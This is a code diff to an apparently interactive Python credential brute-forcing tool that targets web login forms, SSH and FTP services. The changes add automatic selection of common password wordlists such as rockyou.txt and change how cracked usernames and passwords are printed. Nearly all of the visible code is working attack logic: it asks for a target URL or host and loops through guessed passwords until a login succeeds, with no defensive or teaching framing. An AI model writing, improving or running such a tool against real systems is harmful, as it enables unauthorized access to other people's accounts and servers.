@@ -9,12 +9,37 @@ import string
 import sys
 import socket
 import ftplib
+import os
 
 try:
     import paramiko
     PARAMIKO_AVAILABLE = True
 except ImportError:
     PARAMIKO_AVAILABLE = False
+
+DEFAULT_WORDLISTS = [
+    '/usr/share/wordlists/rockyou.txt',
+    '/usr/share/wordlists/rockyou.txt.gz',
+    '/usr/share/dirb/wordlists/common.txt',
+]
+
+
+def get_default_wordlist():
+    for path in DEFAULT_WORDLISTS:
+        if os.path.exists(path):
+            return path
+    return None
+
+
+def prompt_wordlist():
+    default_wl = get_default_wordlist()
+    if default_wl:
+        print(colored(f"  [+] Default wordlist found: {default_wl}", 'green'))
+        wl_input = input(colored("[*] Press ENTER to use default or type custom path: ", 'cyan')).strip()
+        return wl_input if wl_input else default_wl
+    else:
+        print(colored("  [!] No default wordlist found on this system", 'yellow'))
+        return input(colored("[*] Enter path to password file: ", 'cyan')).strip()
 
 
 def print_banner():
@@ -28,7 +53,7 @@ def print_banner():
 
 
 # ════════════════════════════════════════════════════════════════
-#  WEB FORM ATTACK FUNCTIONS
+#  WEB FORM FUNCTIONS
 # ════════════════════════════════════════════════════════════════
 
 def detect_form(url, session):
@@ -275,7 +300,7 @@ def detect_protocol(host, port):
 
 
 # ════════════════════════════════════════════════════════════════
-#  WEB ATTACK MODES
+#  WEB ATTACK RUNNER
 # ════════════════════════════════════════════════════════════════
 
 def run_web_attack(mode, url, usernames, fail_string, delay):
@@ -304,7 +329,7 @@ def run_web_attack(mode, url, usernames, fail_string, delay):
     result = None
 
     if mode in ['1', '4']:
-        password_file = input(colored("[*] Enter path to password file: ", 'cyan'))
+        password_file = prompt_wordlist()
         try:
             with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                 passwords = f.read().splitlines()
@@ -317,12 +342,16 @@ def run_web_attack(mode, url, usernames, fail_string, delay):
             print(colored(f"\n[*] Attacking username: {username}", 'yellow'))
             for count, password in enumerate(passwords, 1):
                 password = password.strip()
-                sys.stdout.write(colored(f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'))
+                sys.stdout.write(colored(
+                    f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'))
                 sys.stdout.flush()
                 if web_attempt_login(url, session, method, action, all_fields, username_field,
                                      password_field, username, password, fail_string, delay, csrf_field):
-                    print(colored(f"\n\n  [+] SUCCESS! {username}:{password}", 'green'))
-                    return username, password
+                    print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+                    print(colored(f"  [+] Username: {username}", 'green'))
+                    print(colored(f"  [+] Password: {password}", 'green'))
+                    result = (username, password)
+                    return result
 
     if mode in ['2', '4'] and not result:
         patterns = build_patterns(usernames)
@@ -330,12 +359,16 @@ def run_web_attack(mode, url, usernames, fail_string, delay):
         for username in usernames:
             print(colored(f"\n[*] Pattern attack on username: {username}", 'yellow'))
             for count, password in enumerate(patterns, 1):
-                sys.stdout.write(colored(f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'))
+                sys.stdout.write(colored(
+                    f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'))
                 sys.stdout.flush()
                 if web_attempt_login(url, session, method, action, all_fields, username_field,
                                      password_field, username, password, fail_string, delay, csrf_field):
-                    print(colored(f"\n\n  [+] SUCCESS! {username}:{password}", 'green'))
-                    return username, password
+                    print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+                    print(colored(f"  [+] Username: {username}", 'green'))
+                    print(colored(f"  [+] Password: {password}", 'green'))
+                    result = (username, password)
+                    return result
 
     if mode in ['3', '4'] and not result:
         min_len = int(input(colored("[*] Minimum password length: ", 'cyan')))
@@ -359,11 +392,14 @@ def run_web_attack(mode, url, usernames, fail_string, delay):
                     sys.stdout.flush()
                     if web_attempt_login(url, session, method, action, all_fields, username_field,
                                          password_field, username, password, fail_string, delay, csrf_field):
-                        print(colored(f"\n\n  [+] SUCCESS! {username}:{password}", 'green'))
+                        print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+                        print(colored(f"  [+] Username: {username}", 'green'))
+                        print(colored(f"  [+] Password: {password}", 'green'))
                         return username, password
 
-    print(colored(f"\n\n[-] Web attack complete -- no valid credentials found", 'red'))
-    return None
+    if not result:
+        print(colored(f"\n\n[-] Web attack complete -- no valid credentials found", 'red'))
+    return result
 
 
 # ════════════════════════════════════════════════════════════════
@@ -383,7 +419,6 @@ def main():
     print(colored("  7. Auto-detect protocol (SSH/FTP)", 'white'))
     mode = input(colored("\n[*] Enter mode (1-7): ", 'cyan'))
 
-    # Web modes
     if mode in ['1', '2', '3', '4']:
         url = input(colored("[*] Enter target login URL: ", 'cyan'))
         usernames_input = input(colored("[*] Enter username(s) (comma separated): ", 'cyan'))
@@ -393,7 +428,6 @@ def main():
         delay = float(delay) if delay.strip() else 0.5
         run_web_attack(mode, url, usernames, fail_string, delay)
 
-    # SSH mode
     elif mode == '5':
         host = input(colored("[*] Enter target host/IP: ", 'cyan'))
         port = input(colored("[*] Enter port (default 22): ", 'cyan'))
@@ -402,10 +436,9 @@ def main():
         usernames = [u.strip() for u in usernames_input.split(',')]
         delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
         delay = float(delay) if delay.strip() else 0.5
-        password_file = input(colored("[*] Enter path to password file: ", 'cyan'))
+        password_file = prompt_wordlist()
         ssh_attack(host, port, usernames, password_file, delay)
 
-    # FTP mode
     elif mode == '6':
         host = input(colored("[*] Enter target host/IP: ", 'cyan'))
         port = input(colored("[*] Enter port (default 21): ", 'cyan'))
@@ -414,10 +447,9 @@ def main():
         usernames = [u.strip() for u in usernames_input.split(',')]
         delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
         delay = float(delay) if delay.strip() else 0.5
-        password_file = input(colored("[*] Enter path to password file: ", 'cyan'))
+        password_file = prompt_wordlist()
         ftp_attack(host, port, usernames, password_file, delay)
 
-    # Auto-detect
     elif mode == '7':
         host = input(colored("[*] Enter target host/IP: ", 'cyan'))
         port = int(input(colored("[*] Enter target port: ", 'cyan')))
@@ -430,7 +462,7 @@ def main():
         usernames = [u.strip() for u in usernames_input.split(',')]
         delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
         delay = float(delay) if delay.strip() else 0.5
-        password_file = input(colored("[*] Enter path to password file: ", 'cyan'))
+        password_file = prompt_wordlist()
         if protocol == 'ssh':
             ssh_attack(host, port, usernames, password_file, delay)
         elif protocol == 'ftp':
